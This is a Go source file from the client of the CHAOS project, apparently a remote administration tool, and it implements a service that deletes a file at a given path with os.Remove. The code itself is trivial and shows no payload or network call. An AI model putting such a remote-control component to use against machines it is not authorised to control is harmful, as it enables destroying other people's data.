package delete

import (
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"os"
)

type DeleteService struct {
}

func NewService() services.Delete {
	return &DeleteService{}
}

func (d DeleteService) DeleteFile(filepath string) error {
	return os.Remove(filepath)
}
